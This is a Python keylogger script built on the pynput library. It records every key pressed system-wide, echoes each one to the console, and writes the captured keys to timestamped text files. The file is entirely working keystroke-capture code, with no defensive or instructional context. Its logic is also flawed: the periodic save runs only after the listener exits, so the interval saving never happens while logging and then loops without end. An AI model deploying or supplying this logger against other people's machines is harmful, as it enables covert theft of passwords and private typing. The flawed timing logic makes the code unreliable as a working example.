import pynput
from pynput.keyboard import Key, Listener
import time
import datetime

keys = []

# Function to handle keypress events
def on_press(key):
    keys.append(key)

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special key {0} pressed'.format(key))

# Function to save the recorded keys to a file with timestamp as filename
def save_file():
    # Get current timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    # Generate filename with timestamp
    filename = f"log_{timestamp}.txt"
    # Write recorded keys to file
    with open(filename, 'w') as f:
        f.write(''.join(str(key) for key in keys))

# Function to handle key release events
def on_release(key):
    print('{0} released'.format(key))
    # If 'esc' key is pressed, save file and stop listener
    if key == Key.esc:
        save_file()
        return False

# Function to start the key listener
def start_listener():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Function to save the file at regular intervals
def interval_save(interval):
    while True:
        time.sleep(float(interval))  # Convert interval to float and wait for specified interval
        save_file()                  # Save the file


# Main block to start the listener and interval saving
if __name__ == "__main__":
    start_listener()    # Start the key listener
    interval_save(60)   # Start saving the file at intervals of 60 seconds
